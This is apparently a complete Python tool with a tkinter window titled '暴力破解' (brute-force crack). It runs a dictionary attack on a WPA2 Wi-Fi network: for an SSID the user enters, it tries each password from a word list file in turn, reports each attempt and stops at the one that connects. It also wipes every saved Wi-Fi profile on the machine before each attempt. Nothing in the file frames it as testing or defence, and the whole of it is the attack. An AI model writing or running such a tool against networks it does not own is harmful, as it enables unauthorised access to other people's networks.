import pywifi
import tkinter as t
import time
from pywifi import const

def wificonnect(wifiname,wifipass):
    # 创建wifi对象
    wifi = pywifi.PyWiFi()
    # 获取第一个网卡
    ifaces = wifi.interfaces()[0]
    # 断开连接
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.key = wifipass
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 删除所有wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接wifi
        ifaces.connect(tep_profile)
        time.sleep(5)


        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False




def readpass():
    wifiname = e1.get()
    path = '11.txt'
    file = open(path,'r')
    while True:
        try:
            wifipass = file.readline()
            bool = wificonnect(wifiname,wifipass)
            if bool:
                # print(f'密码正确是{wifipass}')
                text.insert(t.END,'密码正确是'+wifipass)
                text.see(t.END)
                text.update()
                break
            else:
                # print('密码错误',wifipass)
                text.insert(t.END,'密码错了'+wifipass)
                text.see(t.END)
                text.update()
        except:
            continue
    file.close()


# 控件
root = t.Tk()
# 窗口大小
root.geometry('245x335')

root.title('暴力破解')

r0 = t.Label(root,text = 'wifi名称:',font = 15)
r0.grid(row = 0,column = 0)

# 输入框
e1 = t.Entry(root,font = 22)
e1.grid(row = 0,column = 1)

# 列表框
text = t.Listbox(root,font = ('微软雅黑',15),width = 20,height = 10)
text.grid(row = 1, columnspan = 2)

# 按钮
a1 = t.Button(root,text = '开始破解',font = 12,command = readpass)
a1.grid(row = 2,columnspan = 2)

root.mainloop()